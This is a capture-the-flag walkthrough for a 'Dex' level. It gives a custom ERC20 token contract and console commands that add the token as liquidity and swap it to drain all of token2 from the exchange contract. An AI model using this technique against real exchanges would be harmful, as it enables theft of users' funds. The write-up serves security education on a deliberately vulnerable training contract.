# Dex

**HINT:** Look at how the price is calculated when swapping tokens

<details>
<summary>Part 1</summary>
<p>
Create you own token with OpenZeppelin and approve the dex contract to spend it

```
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

contract DexKillerToken is ERC20 {
    
    constructor () public ERC20("DexKillerToken", "DKT") {
        _mint(msg.sender, 1000000 * (10 ** uint256(decimals())));
    }
}
```
hit ```approve``` add you instance address and approve all minted tokens

</p>
</details>

<details>
<summary>Part 2</summary>
<p>
Now we need to add your token to the liquidity in the dex contract

```js
let DKT = "0xDD21715F70Fa99F13dAcA37D642C3Ec397C935fD"
await contract.add_liquidity(DKT, 100)
```

</p>
</details>

<details>
<summary>Part 3</summary>
<p>

You can check the swap price now that you've added your token
```js
Number(await contract.get_swap_price(DKT, await contract.token2(), 100))
100
```
Then do the swap
```js
await contract.swap(DKT, await contract.token2(), 100)
```
That's it, check the balance of token2 with:
```js
Number(await contract.balanceOf(await contract.token2(), contract.address))
0
```

</p>
</details>


